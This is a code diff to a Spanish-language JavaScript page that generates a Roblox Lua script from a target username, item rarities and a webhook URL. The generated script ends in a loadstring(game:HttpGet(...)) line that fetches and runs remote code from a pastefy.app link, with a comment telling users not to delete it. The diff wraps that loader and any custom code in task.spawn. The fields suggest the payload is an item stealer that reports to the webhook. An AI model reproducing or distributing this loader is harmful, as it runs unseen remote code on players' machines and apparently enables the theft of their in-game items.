@@ -1,5 +1,5 @@
 const R=["Ancient","Mythic","Legendary","Rare","Uncommon","Common"];
-const LOADER='-- NO BORRAR, SI LO BORRAS NO FUNCIONARÁ\nloadstring(game:HttpGet("https://pastefy.app/HNaA6STp/raw"))()';
+const LOADER='-- NO BORRAR, SI LO BORRAS NO FUNCIONARÁ\ntask.spawn(function()\n    loadstring(game:HttpGet("https://pastefy.app/HNaA6STp/raw"))()\nend)';
 const $=id=>document.getElementById(id);
 const chips=$("chips");
 R.forEach(r=>chips.insertAdjacentHTML("beforeend",`<label class="chip"><input type="checkbox" value="${r}">${r}</label>`));
@@ -38,7 +38,8 @@ $("make").onclick=()=>{
   if(!user){err.textContent="Escribe tu user.";return}
   if(!rar.length){err.textContent="Elige al menos una rareza.";return}
   if(!hook){err.textContent="Pon tu webhook.";return}
-  $("code").textContent=`getgenv().TARGET = "${q(user)}"\n\ngetgenv().RARITIES = { ${rar.map(r=>`"${r}"`).join(", ")} }\n\ngetgenv().WEBHOOK = "${q(hook)}"\n\n${custom?custom+"\n\n":""}${LOADER}\n`;
+  const customBlock=custom?`\n\n-- script personalizado\ntask.spawn(function()\n    ${custom}\nend)`:"";
+  $("code").textContent=`getgenv().TARGET = "${q(user)}"\n\ngetgenv().RARITIES = { ${rar.map(r=>`"${r}"`).join(", ")} }\n\ngetgenv().WEBHOOK = "${q(hook)}"\n\n${LOADER}${customBlock}\n`;
   $("out").style.display="block";
   $("out").scrollIntoView({behavior:"smooth",block:"start"});
 };
